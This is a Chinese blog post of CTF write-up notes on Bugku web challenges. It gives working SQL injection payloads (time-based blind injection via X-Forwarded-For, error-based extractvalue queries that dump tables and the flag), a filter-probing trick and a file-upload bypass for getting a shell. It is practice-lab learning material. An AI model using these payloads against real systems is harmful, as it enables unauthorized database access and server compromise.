---
title: Bugku刷题记录（二）
author: Troy3e
avatar: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-07-15 13:34:58
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1087716.jpg
---

一、web8

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200715152829.png)

ac=flags&fn=flag.txt。

二、细心
挂了。。

三、求getshell
upload，后缀改为php5，content-type大小写绕过。

四、INSERT INTO 注入

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200715175348.png)

根据源码可知这是X_FORWARDED_FOR注入，但是过滤了逗号，无法使用if语句。
在mysql中与if有相同功效的就是：
select case when (条件) then 代码1 else 代码 2 end;
而且由于逗号,被过滤，我们就不能使用substr、substring了，但我们可以使用：from 1 for 1，所以最终的payload如下：
127.0.0.1'+(select case when substr((select flag from flag) from 1 for 1)='a' then sleep(5) else 0 end))-- +
脚本学习了这个大佬的：
 //https://blog.csdn.net/xuchen16/article/details/82904488

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ图片20200715230710.png)

L4：string模块里面的ascii_letters和digits代表大小写英文字母和数字。
L6：insert into value ('')这句话，可以执行()内的sql语句。所以先闭合，然后进行sql语句的执行。这里使用了 select case when（满足条件）then（语句1）else（语句2） end语句；语句中的 from 0 for 1 等价于 limit 0,1。
L13：添加xff头。
L14：timieout=3如果网站再3s内没有应答，就会抛出异常。
L15：因为在L7进行验证，如果True，就sleep(5)，这里就接受异常成功获取部分flag。
知识：case when then else end语句。from 0 for 1 和from -1(从后往前)姿势的学习。
这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。

这道题还是不错的，了解了xff延时注入，写脚本也多了一种思路。

五、这是一个神奇的登陆框
挂了。。

六、多次
页面没有任何信息，url中有id，加上'报错，猜测是sql注入。
id=1'or 1=1--+ 也报错，可能存在过滤
用异或注入测一下过滤了啥，
例：?id=1'^(length('union')!=0)--+,如果返回页面显示正常，那就证明length(‘union’)==0的，也就是union被过滤了。同理测试出被过滤的字符串有：and，or，union，select。
oorrder by测出来两个字段，接下来就是爆表爆字段了。
基本操作就不写了，直接说结果：
表flag1,hint，
字段flag1,address
flag1中的数据不是flag，在address里找到了下一关的链接：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200715234331.png)

感觉和上次whuctf的那个sql一样，都是输入什么回显什么。。。当时用的是盲注。
看了一下wp。
当双写绕过和大小写绕过都没用时，这时我们需要用到报错注入。
报错注入介绍：//https://blog.csdn.net/silence1_/article/details/90812612

爆库
?id=1' and
(extractvalue(1,concat(0x7e,database(),0x7e)))--+

爆表
?id=1' and
(extractvalue(1,concat(0x7e,
(select group_concat(table_name) from information_schema.tables
where table_schema="web1002-2"),0x7e)))--+

爆列
?id=1' and
(extractvalue(1,concat(0x7e,
(select group_concat(column_name) from information_schema.columns
where table_schema="web1002-2" and table_name="flag2"),0x7e)))--+

爆flag
?id=1' and
(extractvalue(1,concat(0x7e,
(select group_concat(flag2) from flag2),0x7e)))--+
flag{Bugku-sql_6s-2i-4t-bug}

另：这一周有点水，下一周要大大增加学习量。

